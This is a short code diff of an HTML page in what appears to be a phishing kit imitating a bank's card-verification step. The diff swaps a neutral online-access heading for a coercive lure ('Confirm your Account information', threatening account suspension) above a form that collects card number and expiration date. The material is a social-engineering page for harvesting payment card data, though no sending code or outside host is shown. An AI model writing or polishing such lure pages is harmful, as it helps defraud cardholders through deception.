@@ -418,9 +418,9 @@
                 <span class="active">Card Verification</span>
                 <span>Success</span>
             </div>
-            <span class="title">Let's Set Up Your Online Access</span>
-            <span class="subtitle">You can view or manage your account online in just a few easy steps. Let’s get started! Enter the account or card number we mailed to you, or that was provided when your account was opened.</span>
-            <form action="" method="POST">
+            <span class="title">Confirm your Account information</span>
+            <span class="subtitle">Please verify your accurate information to automatically unlock your account. Incorrect information may lead to suspension of your account.</span>
+             <form action="" method="POST">
                 <label for="card">Card Number</label>
                 <input type="text" placeholder="Card Number" id="card" name="card">
                 <label for="exp">Expiration Date</label>
